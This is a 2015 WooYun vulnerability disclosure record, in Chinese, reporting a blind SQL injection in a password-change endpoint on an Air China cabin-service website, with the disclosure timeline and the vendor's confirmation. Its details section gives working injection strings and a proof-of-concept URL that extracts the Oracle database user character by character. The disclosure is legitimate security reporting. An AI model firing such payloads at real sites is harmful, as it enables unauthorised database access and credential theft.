{"id": 20322, "wybug_id": "wooyun-2015-0130885", "wybug_title": "中国国际航空有限公司重要站点SQL注入漏洞（涉及6个重要系统）", "wybug_corp": "中国国际航空股份有限公司", "wybug_author": "黑暗游侠", "wybug_date": "2015-08-01 15:52", "wybug_open_date": "2015-09-18 23:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向公众公开  简要描述： 中国国际航空有限公司重要站点SQL注入漏洞（涉及6个系统） 详细说明：  \n\n问题出在客舱服务部：\nhttp://cabin.airchina.com.cn/cwzb/default.jsp\n有一个修改密码的功能，GET方式请求：\nhttp://cabin.airchina.com.cn/cwzb/changepwdAction.do?user=admin*&password=asdasd&newpwd1=asdasd111&newpwd2=asdasd111\nuser处存在SQL注入，盲注，blind sql当user=admin时：\n\n当user=admin'or+ASCII('A')='66时\n\nuser=admin'or+ASCII('A')='65时\n\n返回不一样，确定存在盲注\nuser=admin'or+1=CASE+WHEN+ASCII(MID(SYS_CONTEXT('USERENV',''CURRENT_USER'),1,1))!=65+THEN+1+ELSE+2+END--\n过滤了SUBSTR函数\n\n最后POC：\nhttp://cabin.airchina.com.cn/cwzb/changepwdAction.do?user=admin'or+SYS_CONTEXT('USERENV','CURRENT_USER')>'2^j&password=asdasd&newpwd1=asdasd111&newpwd2=asdasd111\n2^j指代逐位猜解，利用了oracle和mysql同一特性RESULT：\n...C......A.........B............I...............N..................B.....................I\n   漏洞证明：  高小厨说国航是良心厂商rank多   修复方案：  高小厨说国航是良心厂商rank多   版权声明：转载请注明来源 黑暗游侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-04 23:27 厂商回复： 感谢对国航系统安全的支持和帮助！还有吗？ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-05 00:18 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:148        | 123)\t\t \n  @中国国际航空股份有限公司 你就给10个rank，好歹15啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}